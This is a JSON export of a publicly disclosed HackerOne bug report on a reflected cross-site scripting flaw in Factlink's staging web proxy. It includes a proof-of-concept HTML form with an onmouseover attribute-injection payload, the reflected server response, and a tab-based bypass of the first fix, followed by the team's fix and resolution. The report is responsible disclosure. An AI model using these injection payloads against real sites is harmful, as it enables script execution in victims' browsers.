{"id":18805,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODgwNQ==","url":"https://hackerone.com/reports/18805","title":"XSS 01 on staging.fct.li","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-07-02T18:38:59.656Z","submitted_at":"2014-07-02T18:38:59.656Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"pum","url":"/pum","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/283/1b173be2ad7b39fe302f8c49f403219c3bb1bd99_original.PNG/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":3,"url":"https://hackerone.com/factlink","handle":"factlink","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/003/319a03f582c31852bc62d152493fe213ef3aaad3_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/003/319a03f582c31852bc62d152493fe213ef3aaad3_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"disabled","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Factlink","twitter_handle":"factlink","website":"https://factlink.com","about":"Share your knowledge with the world."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2014-07-07T17:36:31.692Z","bug_reporter_agreed_on_going_public_at":"2014-07-07T17:36:31.489Z","team_member_agreed_on_going_public_at":"2014-07-07T10:38:49.059Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"hey\r\n\r\nthe error message generated can be used to escape out of a dynamically generated href link. The below will render in internet explorer (without xss filter enabled of course). See the screenshot for an example.\r\n\r\n\r\n\u003chtml\u003e\r\n  \u003cbody\u003e\r\n    \u003cform action=\"http://staging.fct.li/\" method=\"POST\"\u003e\r\n      \u003cinput type=\"hidden\" name=\"url\" value=\"unana\u0026apos;\u0026#32;onmouseover\u0026#61;alert\u0026#40;1\u0026#41;\u0026#32;some\u0026#61;\u0026apos;na\u0026#46;google\u0026#46;de\" /\u003e\r\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\r\n    \u003c/form\u003e\r\n  \u003c/body\u003e\r\n\u003c/html\u003e\r\n\r\n\r\nThe response is:\r\n    HTTP/1.1 504 Gateway Time-out\r\n    Server: nginx/1.4.4\r\n    Date: Wed, 02 Jul 2014 18:13:51 GMT\r\n    Content-Length: 215\r\n    Connection: keep-alive\r\n\r\n    This page is taking unusually long to load. You can try visiting the site without Factlink: \u003ca href='http://unana' onmouseover=alert(1) some='na.google.de/'\u003ehttp://unana' onmouseover=alert(1) some='na.google.de/\u003c/a\u003e\r\n\r\n\r\nBecause of the \"onmouseover\" event waiting for its trigger you need to move your mouse over the link ...\r\n\r\ncheers pUm","vulnerability_information_html":"\u003cp\u003ehey\u003c/p\u003e\n\n\u003cp\u003ethe error message generated can be used to escape out of a dynamically generated href link. The below will render in internet explorer (without xss filter enabled of course). See the screenshot for an example.\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;html\u0026gt;\u003cbr\u003e\n  \u0026lt;body\u0026gt;\u003cbr\u003e\n    \u0026lt;form action=\u0026quot;http://staging.fct.li/\u0026quot; method=\u0026quot;POST\u0026quot;\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;hidden\u0026quot; name=\u0026quot;url\u0026quot; value=\u0026quot;unana\u0026amp;apos;\u0026amp;#32;onmouseover\u0026amp;#61;alert\u0026amp;#40;1\u0026amp;#41;\u0026amp;#32;some\u0026amp;#61;\u0026amp;apos;na\u0026amp;#46;google\u0026amp;#46;de\u0026quot; /\u0026gt;\u003cbr\u003e\n      \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;Submit request\u0026quot; /\u0026gt;\u003cbr\u003e\n    \u0026lt;/form\u0026gt;\u003cbr\u003e\n  \u0026lt;/body\u0026gt;\u003cbr\u003e\n\u0026lt;/html\u0026gt;\u003c/p\u003e\n\n\u003cp\u003eThe response is:\u003cbr\u003e\n    HTTP/1.1 504 Gateway Time-out\u003cbr\u003e\n    Server: nginx/1.4.4\u003cbr\u003e\n    Date: Wed, 02 Jul 2014 18:13:51 GMT\u003cbr\u003e\n    Content-Length: 215\u003cbr\u003e\n    Connection: keep-alive\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eThis page is taking unusually long to load. You can try visiting the site without Factlink: \u0026lt;a href=\u0026#39;http://unana\u0026#39; onmouseover=alert(1) some=\u0026#39;na.google.de/\u0026#39;\u0026gt;http://unana\u0026#39; onmouseover=alert(1) some=\u0026#39;na.google.de/\u0026lt;/a\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eBecause of the \u0026quot;onmouseover\u0026quot; event waiting for its trigger you need to move your mouse over the link ...\u003c/p\u003e\n\n\u003cp\u003echeers pUm\u003c/p\u003e\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":12527,"file_name":"Bildschirmfoto_2014-07-02_um_20.26.17.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/012/527/d08d54d37d04314af79720b6e4aae0ac96e8d083/Bildschirmfoto_2014-07-02_um_20.26.17.PNG?response-content-disposition=attachment%3B%20filename%3D%22Bildschirmfoto_2014-07-02_um_20.26.17.PNG%22%3B%20filename%2A%3DUTF-8%27%27Bildschirmfoto_2014-07-02_um_20.26.17.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTGH7D7G4%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T044812Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIF3bZwIuJVbBath9RBAagycfg6N290U9MaBDwIhhNMqjAiEA5QJFTUjUu%2BelINQ8mBSRMtPAJunx%2FkQdIQYoGvxoAn0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDKWCtAdrSoxlUzEo5CqRA2KbCK2gb0cQjXvMxG7rxH%2BqkR2WSbvaIs%2FZazFNKw1eZW2WrZTy5Q04uSJp6R8rbsBzRSLIFhyP9QTQMq5P15qLdwXnZbOxNVoADzWwgfUfGt%2BOwI%2BEjM3ovXNd1aGU0Ee1TBGk3LBN3uQ8ppV7Xii57PrmCtM4dm9usXbAaaa8f8QiQFPH1YTkHf%2FPe1cgMlFNJFqSrmu3ZMinUb9pxpphywkYT29wP%2Fak4Sy9A3St63iqnDzi8wrdG9%2FGdB7M03pSeaVTcH99G5j%2FqMpFpJxYN8TNlglA1OWgt7QlVOqnq65zCp4szGmwzF1FrjkS%2Bp3wB27lGxlw0v79ozRdwRBFBFvrSgSeToK8vpEBIlnO4uogSsVneM6zoYfyQw3%2F6HqcPg9mVWJmJS4QLMpQTMd%2FMeYn%2F%2Ffl2Vt%2Bb0X2rNtQPeWMGpzHpq6XAiCjZ%2F33fJuN%2B3j9Lmo023GSXKu%2B%2FkZTBp3waVREDqE%2BNeB30X8ZT5%2BW0bqtpGbJe8ig5jtSZzprCWg9v84Utvz3uaa%2Bcjz7MJPPqv8FOusBEHCYkRstnRk5lzIXoX3CRWjAJcL61b1gmhmecG%2Fow23IgJkGaQ5%2B%2FkCWvGrt4rLn9BlUKR84X6ifbCLPwMQevITvtVqg1wdT%2FzOjUyHnqnZVOyLFoqLXk9MNjw1VTb%2FmSNp%2Bd5NsBD5KiAAd50U1%2F1jl5yoSrl0DpEi6Yzv0bFigmUQPNRZeTImBJ2V75RxXBbDSoevWuBT70W%2F8%2BsoyTMqti7McilmsidA1BnI1f8HDTyMQGIoexlo%2BO7e5AiNtCUboKL2ZiertWXe5cEVF9mAVgHpVtz7pIIElyyZjsKslJzP%2B5WRhYUkMYg%3D%3D\u0026X-Amz-Signature=92485e78397df02ae4806b73c3301dbc2e355078525f21df0c41e97646e7c983","file_size":50149,"type":"image/png"}],"allow_singular_disclosure_at":"2014-08-06T10:38:49.264Z","allow_singular_disclosure_after":-201895763.33812845,"singular_disclosure_allowed":true,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":83632,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks for your report. We're looking into it.","markdown_message":"\u003cp\u003eThanks for your report. We\u0026#39;re looking into it.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-07-03T10:04:42.364Z","updated_at":"2014-07-03T10:04:42.364Z","actor":{"username":"markijbema","cleared":false,"url":"/markijbema","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/704/902185099ec49b8635411a783a27eedc6a52cd05_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"factlink","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":83674,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Can you confirm that this bug has been resolved? The fixed version is live, you can see the code for the fix here: \n\nhttps://github.com/Factlink/web-proxy/pull/21\n\nI've properly set the content-type now, and also added a little sanitation.","markdown_message":"\u003cp\u003eCan you confirm that this bug has been resolved? The fixed version is live, you can see the code for the fix here: \u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://github.com/Factlink/web-proxy/pull/21\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FFactlink%2Fweb-proxy%2Fpull%2F21\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/Factlink/web-proxy/pull/21\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve properly set the content-type now, and also added a little sanitation.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-07-03T12:19:58.079Z","updated_at":"2014-07-03T12:19:58.079Z","actor":{"username":"markijbema","cleared":false,"url":"/markijbema","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/704/902185099ec49b8635411a783a27eedc6a52cd05_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"factlink","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":84386,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey,\n\nyes the content-type fixed it. You can bypass your whitespace fix with a \"tab\" like:\n    url=unana'\tonmouseover=alert(1)\tsome='na.google.de\n\nHowever, as said, no content sniffing is performed anymore and therefore it won't execute anymore. My recommendation would still be to make a whitelist of allowed characters where possible :)\n\nThanks\n\npUm","markdown_message":"\u003cp\u003eHey,\u003c/p\u003e\n\n\u003cp\u003eyes the content-type fixed it. You can bypass your whitespace fix with a \u0026quot;tab\u0026quot; like:\u003cbr\u003e\n    url=unana\u0026#39;  onmouseover=alert(1)    some=\u0026#39;na.google.de\u003c/p\u003e\n\n\u003cp\u003eHowever, as said, no content sniffing is performed anymore and therefore it won\u0026#39;t execute anymore. My recommendation would still be to make a whitelist of allowed characters where possible :)\u003c/p\u003e\n\n\u003cp\u003eThanks\u003c/p\u003e\n\n\u003cp\u003epUm\u003c/p\u003e\n","automated_response":false,"created_at":"2014-07-04T16:02:18.621Z","updated_at":"2014-07-04T16:02:46.331Z","actor":{"username":"pum","cleared":false,"url":"/pum","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/283/1b173be2ad7b39fe302f8c49f403219c3bb1bd99_original.PNG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"factlink","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":85235,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I agree that would be cleaner, however, since it's not exploitable we've decided not to spent more time in addional measures here. Thanks for your report, and checking our solution!","markdown_message":"\u003cp\u003eI agree that would be cleaner, however, since it\u0026#39;s not exploitable we\u0026#39;ve decided not to spent more time in addional measures here. Thanks for your report, and checking our solution!\u003c/p\u003e\n","automated_response":false,"created_at":"2014-07-07T10:38:26.787Z","updated_at":"2014-07-07T10:38:26.787Z","actor":{"username":"markijbema","cleared":false,"url":"/markijbema","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/704/902185099ec49b8635411a783a27eedc6a52cd05_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"factlink","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":85236,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2014-07-07T10:38:42.369Z","updated_at":"2014-07-07T10:38:42.369Z","actor":{"username":"markijbema","cleared":false,"url":"/markijbema","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/704/902185099ec49b8635411a783a27eedc6a52cd05_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"pum","url":"/pum"},"genius_execution_id":null,"team_handle":"factlink","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":85237,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-07-07T10:38:49.073Z","updated_at":"2014-07-07T10:38:49.073Z","first_to_agree":true,"actor":{"username":"markijbema","cleared":false,"url":"/markijbema","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/704/902185099ec49b8635411a783a27eedc6a52cd05_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"factlink","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":85468,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-07-07T17:36:31.504Z","updated_at":"2014-07-07T17:36:31.504Z","actor":{"username":"pum","cleared":false,"url":"/pum","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/283/1b173be2ad7b39fe302f8c49f403219c3bb1bd99_original.PNG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"factlink","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":85469,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-07-07T17:36:31.716Z","updated_at":"2014-07-07T17:36:31.716Z","actor":{"username":"pum","cleared":false,"url":"/pum","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/283/1b173be2ad7b39fe302f8c49f403219c3bb1bd99_original.PNG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"factlink","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}